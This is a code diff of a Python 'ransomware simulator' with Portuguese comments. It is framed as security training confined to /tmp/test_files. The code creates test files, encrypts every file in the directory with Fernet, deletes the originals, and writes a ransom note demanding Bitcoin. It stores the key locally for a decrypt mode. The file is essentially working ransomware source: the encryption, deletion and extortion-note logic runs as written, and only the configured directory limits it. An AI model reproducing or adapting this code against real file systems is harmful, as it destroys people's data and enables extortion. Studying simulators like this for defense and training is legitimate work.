@@ -1,63 +1,73 @@
+# ramsoware teste 
 import os
 import sys
 from cryptography.fernet import Fernet
 import time
 
-# Diretório de teste (ajuste para um diretório seguro em sua VM)
-TEST_DIR = "/tmp/test_files"  # Nunca use em diretórios críticos!
+# Configurações de diretório (ajuste para um caminho seguro em sua VM)
+TEST_DIR = "/tmp/test_files"  # Diretório de testes - NUNCA use em diretórios críticos do sistema!
+KEY_FILE = os.path.join(TEST_DIR, "generated_key.key")  # Chave salva no mesmo diretório para facilitar recuperação
 
 def setup_test_files():
-    """Cria arquivos de teste para simulação."""
+    """Cria arquivos de texto de teste para simulação."""
     os.makedirs(TEST_DIR, exist_ok=True)
     for i in range(5):
-        with open(os.path.join(TEST_DIR, f"test_file_{i}.txt"), "w") as f:
-            f.write(f"Arquivo de teste {i} - Conteúdo simulado.\n" * 10)
+        file_path = os.path.join(TEST_DIR, f"test_file_{i}.txt")
+        with open(file_path, "w") as f:
+            f.write(f"Arquivo de teste {i} - Conteúdo simulado para treinamento de segurança.\n" * 10)
     print(f"[+] Arquivos de teste criados em {TEST_DIR}")
 
 def generate_key():
-    """Gera uma chave de criptografia Fernet."""
+    """Gera uma chave de criptografia Fernet e salva no arquivo KEY_FILE."""
     key = Fernet.generate_key()
-    with open("generated_key.key", "wb") as key_file:
+    with open(KEY_FILE, "wb") as key_file:
         key_file.write(key)
+    print(f"[+] Chave gerada e salva em: {KEY_FILE}")
     return key
 
 def encrypt_files(key, directory=TEST_DIR):
-    """Criptografa arquivos no diretório."""
+    """Criptografa arquivos no diretório especificado."""
     f = Fernet(key)
     encrypted_count = 0
     for root, dirs, files in os.walk(directory):
         for file in files:
             file_path = os.path.join(root, file)
+            if file_path == KEY_FILE or file.endswith(".encrypted") or file.endswith(".txt") and "READ_ME" in file:
+                continue  # Pula a chave, arquivos criptografados e notas de resgate
             try:
                 with open(file_path, "rb") as original_file:
                     original_data = original_file.read()
                 encrypted_data = f.encrypt(original_data)
-                with open(file_path + ".encrypted", "wb") as encrypted_file:
+                encrypted_file_path = file_path + ".encrypted"
+                with open(encrypted_file_path, "wb") as encrypted_file:
                     encrypted_file.write(encrypted_data)
-                os.remove(file_path)  # Remove original (apenas para simulação)
+                os.remove(file_path)  # Remove o original (simulação de perda de acesso)
                 encrypted_count += 1
-                print(f"[+] Criptografado: {file_path}")
+                print(f"[+] Criptografado: {file_path} -> {encrypted_file_path}")
             except Exception as e:
                 print(f"[-] Erro ao criptografar {file_path}: {e}")
     print(f"[+] Total de arquivos criptografados: {encrypted_count}")
 
 def generate_ransom_note(key):
-    """Gera nota de resgate (simulada)."""
+    """Gera uma nota de resgate simulada."""
     note = f"""
     === NOTA DE RESGATE SIMULADA ===
-    Seus arquivos foram criptografados! Para recuperá-los:
-    1. Pague 0.001 BTC para o endereço: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa (simulado)
-    2. Envie o ID: {key.decode()[:20]}...
-    3. Aguarde instruções.
+    Seus arquivos foram criptografados! Para recuperá-los, siga estas etapas:
     
-    ATENÇÃO: Não modifique arquivos! Chave única gerada em: {time.ctime()}
+    1. Envie 0.001 BTC para o endereço: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa (simulado para treinamento).
+    2. Use o ID da chave para contato: {key.decode()[:20]}...
+    3. Aguarde instruções de descriptografia.
+    
+    ATENÇÃO: Não modifique os arquivos criptografados! A chave única foi gerada em: {time.ctime()}
+    Para mais informações, entre em contato com a equipe de segurança.
     """
-    with open(os.path.join(TEST_DIR, "READ_ME.txt"), "w") as f:
+    note_path = os.path.join(TEST_DIR, "READ_ME.txt")
+    with open(note_path, "w") as f:
         f.write(note)
-    print("[+] Nota de resgate gerada: READ_ME.txt")
+    print(f"[+] Nota de resgate gerada: {note_path}")
 
 def decrypt_files(key, directory=TEST_DIR):
-    """Descriptografa arquivos (para recuperação simulada)."""
+    """Descriptografa arquivos .encrypted no diretório."""
     f = Fernet(key)
     decrypted_count = 0
     for root, dirs, files in os.walk(directory):
@@ -68,7 +78,7 @@ def decrypt_files(key, directory=TEST_DIR):
                     with open(file_path, "rb") as encrypted_file:
                         encrypted_data = encrypted_file.read()
                     decrypted_data = f.decrypt(encrypted_data)
-                    original_path = file_path[:-10]  # Remove .encrypted
+                    original_path = file_path[:-10]  # Remove ".encrypted"
                     with open(original_path, "wb") as original_file:
                         original_file.write(decrypted_data)
                     os.remove(file_path)
@@ -81,26 +91,38 @@ def decrypt_files(key, directory=TEST_DIR):
 def main():
     if len(sys.argv) < 2:
         print("Uso: python3 ransomware_simulator.py [encrypt|decrypt]")
+        print("Exemplo: python3 ransomware_simulator.py encrypt")
         sys.exit(1)
     
     action = sys.argv[1]
-    setup_test_files()
+    setup_test_files()  # Sempre prepara o ambiente
     
     if action == "encrypt":
         key = generate_key()
         encrypt_files(key)
         generate_ransom_note(key)
-        print("[*] Simulação completa! Chave salva em generated_key.key")
+        print("\n[*] Simulação de ransomware completa!")
+        print(f"[*] Chave salva em: {KEY_FILE}")
+        print(f"[*] Arquivos criptografados em: {TEST_DIR}")
+        print("[*] Nota de resgate: READ_ME.txt")
     elif action == "decrypt":
+        if not os.path.exists(KEY_FILE):
+            print(f"[-] ERRO: Chave não encontrada em {KEY_FILE}")
+            print("[-] Execute 'encrypt' primeiro para gerar a chave e criptografar os arquivos.")
+            sys.exit(1)
+        
         try:
-            with open("generated_key.key", "rb") as key_file:
+            with open(KEY_FILE, "rb") as key_file:
                 key = key_file.read()
             decrypt_files(key)
-            print("[*] Descriptografia concluída.")
-        except FileNotFoundError:
-            print("[-] Chave não encontrada. Execute encrypt primeiro.")
+            print("\n[*] Descriptografia concluída com sucesso!")
+            print(f"[*] Arquivos restaurados em: {TEST_DIR}")
+        except Exception as e:
+            print(f"[-] Erro ao carregar ou usar a chave: {e}")
+            print("[-] Verifique se a chave está correta ou corrompida.")
     else:
         print("Ação inválida. Use 'encrypt' ou 'decrypt'.")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
